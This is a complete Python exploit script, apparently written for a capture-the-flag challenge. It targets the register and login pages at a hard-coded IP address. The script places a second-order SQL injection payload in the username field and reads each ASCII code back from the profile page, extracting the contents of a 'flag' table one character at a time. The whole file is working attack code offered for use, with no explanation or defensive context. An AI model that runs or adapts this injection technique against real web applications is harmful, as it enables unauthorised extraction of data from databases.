import requests
import re

register_url = 'http://111.200.241.244:50171/register.php'
login_url = 'http://111.200.241.244:50171/login.php'
flag = ''

for i in range(1, 40):
    register_data = {'email':'hoa@hh%d.com' % i,'username':"0'+ascii(substr((select * from flag) from %d for 1))+'0" % i, 'password':'test'}
    register_response = requests.post(url = register_url, data = register_data)
    login_data = {'email':'hoa@hh%d.com' % i, 'password':'test'}
    login_response = requests.post(url = login_url, data = login_data)
    num_char = re.search('<span class="user-name">\n(.*)</span>', login_response.text)
    num_char = num_char.group(1).strip()
    num_char = chr(int(num_char))
    flag = flag + num_char
    print(flag)
